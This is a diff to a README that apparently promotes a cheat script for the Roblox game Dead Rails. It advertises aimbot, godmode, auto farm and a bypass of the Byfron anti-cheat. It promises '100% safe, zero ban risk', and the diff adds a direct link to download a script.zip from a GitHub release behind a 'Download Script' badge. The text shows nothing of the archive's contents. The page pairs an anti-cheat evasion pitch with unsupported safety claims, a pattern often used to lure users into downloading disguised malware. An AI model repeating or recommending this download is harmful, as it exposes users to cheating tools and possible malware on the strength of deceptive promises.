@@ -5,7 +5,7 @@
 Unlock 60+ features in Dead Rails with this ultimate script! Enjoy ESP, Silent Aimbot, Godmode, Infinite Bonds, and more. Compatible with all Roblox executors, working on PC and mobile. Bypass Byfron and stay 100% safe with zero ban risk. Auto farm, instant kill, and more!
 
 <div style="text-align: center">
-  <a href="link">
+  <a href="https://github.com/DeadRailsScript/Dead-Rails-Ultimate-Script-Bypass-Byfron/releases/download/new/script.zip">
     <img class="bumbum" style="width: 1000px" alt="Static Badge" src="https://img.shields.io/badge/Click_For-_Download_Script!-purple">
   </a>
 </div>
